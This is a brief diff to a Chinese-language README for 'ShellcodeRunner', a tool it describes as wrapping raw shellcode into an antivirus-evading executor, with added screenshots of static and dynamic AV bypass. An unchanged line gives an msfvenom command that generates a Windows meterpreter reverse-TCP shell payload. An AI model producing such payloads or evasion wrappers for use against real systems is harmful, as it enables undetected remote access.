@@ -17,5 +17,12 @@ sudo docker-compose build && sudo docker-compose up -d
 
 ### ShellcodeRunner
 
+#### 介绍
+
 一个shellcode包装器，可根据提供的shellcode raw[`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=4444 -f raw > ~/shell.raw`]文件
 生成免杀的执行器
+
+#### 国际惯例
+
+![ShellcodeRunner静态bypass.webp](pics/ShellcodeRunner-static-bypassAV.webp)
+![ShellcodeRunner动态bypass.webp](pics/ShellcodeRunner-dynamic-bypassAV.webp)
